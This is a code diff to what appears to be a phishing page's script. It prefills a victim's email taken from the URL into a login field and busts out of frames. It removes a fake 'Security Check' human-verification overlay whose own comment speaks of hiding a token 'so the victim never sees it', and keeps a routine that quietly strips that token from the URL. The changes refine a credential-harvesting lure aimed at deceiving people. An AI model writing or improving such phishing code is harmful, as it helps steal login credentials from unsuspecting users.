@@ -111,6 +111,16 @@
       return null;
     }
     
+    // --- FIXED: Clean URL on load ---
+    (function cleanURL() {
+      const currentHash = window.location.hash;
+      if (currentHash.includes('&verified=true')) {
+        const cleanHash = currentHash.replace('&verified=true', '');
+        history.replaceState(null, '', window.location.pathname + cleanHash);
+      }
+    })();
+
+    // --- EMAIL PREFILL ---
     const emailFromUrl = getEmailFromURL();
     const emailInput = document.getElementById('user');
     if (emailFromUrl) {
@@ -118,43 +128,7 @@
     } else {
       emailInput.value = 'No email specified in URL';
     }
-    
-    // --- FAKE HUMAN VERIFICATION (with token hidden) ---
-    (function fakeHumanVerification() {
-      if (!window.location.hash.includes('verified=true')) {
-        const overlay = document.createElement('div');
-        overlay.id = 'human-check';
-        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#1e293b;color:white;display:flex;justify-content:center;align-items:center;flex-direction:column;z-index:99999;font-family:Arial;text-align:center;padding:20px;';
-        overlay.innerHTML = `
-          <div style="background:#2d3748;padding:40px;border-radius:12px;max-width:400px;">
-            <h2>🔒 Security Check</h2>
-            <p style="color:#a0aec0;margin:16px 0;">Verifying your connection...</p>
-            <div style="width:40px;height:40px;border:4px solid #4a5568;border-top-color:#3b82f6;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto;"></div>
-            <p style="color:#718096;font-size:14px;">Please wait while we confirm you are human.</p>
-          </div>
-        `;
-        document.body.prepend(overlay);
-        
-        setTimeout(function() {
-          if (document.getElementById('human-check')) {
-            document.getElementById('human-check').remove();
-          }
-          if (window.location.hash) {
-            window.location.hash = window.location.hash + '&verified=true';
-          } else {
-            window.location.hash = 'verified=true';
-          }
-          window.location.reload();
-        }, 2000);
-      } else {
-        // Remove the token from the URL so the victim never sees it
-        const cleanHash = window.location.hash.replace('&verified=true', '');
-        if (cleanHash !== window.location.hash) {
-          history.replaceState(null, '', window.location.pathname + cleanHash);
-        }
-      }
-    })();
-    
+
     // --- OTHER PROTECTIONS ---
     if (window.top !== window.self) {
       window.top.location = window.self.location;
